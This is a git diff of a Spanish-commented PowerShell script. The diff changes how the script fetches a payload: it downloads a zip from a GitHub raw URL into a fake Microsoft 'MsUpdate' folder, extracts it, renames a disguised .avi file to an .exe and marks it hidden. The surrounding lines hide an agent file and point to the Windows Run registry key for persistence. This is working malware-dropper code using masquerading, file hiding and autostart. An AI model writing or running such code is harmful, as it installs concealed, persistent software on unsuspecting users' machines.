@@ -21,17 +21,32 @@ $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.F
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
 
 # Copy Ejecuter
-$rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
-$urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
-if (-not (Test-Path $rutaLocalEjecuter)) {
-    Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
+# Definir rutas locales y URL
+$rutaLocalZip = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.zip"
+$urlRemotoZip = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.zip"
+$rutaDestinoExtraido = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN"
+$rutaArchivoAvi = "$rutaDestinoExtraido\SMSUCN.avi"
+$rutaArchivoExe = "$rutaDestinoExtraido\SMSUCN.exe"
+
+# Descargar el archivo zip si no existe
+if (-not (Test-Path $rutaLocalZip)) {
+    Invoke-WebRequest -Uri $urlRemotoZip -OutFile $rutaLocalZip
 }
-if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.exe") {
-    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN.avi', 'SMSUCN.exe'
-    Rename-Item -Path $rutaLocalEjecuter -NewName $rutaNuevoNombreEjecuter
+# Extraer el contenido del zip si no se ha extraído aún
+if (-not (Test-Path $rutaDestinoExtraido)) {
+    # Crear la carpeta de destino si no existe
+    New-Item -Path $rutaDestinoExtraido -ItemType Directory
+    # Extraer el archivo zip
+    Expand-Archive -Path $rutaLocalZip -DestinationPath $rutaDestinoExtraido -Force
 }
-$atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $rutaLocalEjecuter -Name Attributes -Value $atributosOcultosEjecuter
+# Comprobar si el archivo SMSUCN.avi existe y renombrarlo como .exe
+if (Test-Path $rutaArchivoAvi) {
+    Rename-Item -Path $rutaArchivoAvi -NewName $rutaArchivoExe
+}
+# Opcionalmente, establecer el archivo renombrado como oculto
+$atributosOcultos = (Get-Item $rutaArchivoExe).Attributes -bor [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $rutaArchivoExe -Name Attributes -Value $atributosOcultos
+
 
 # Registry path for the startup entries
 $rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
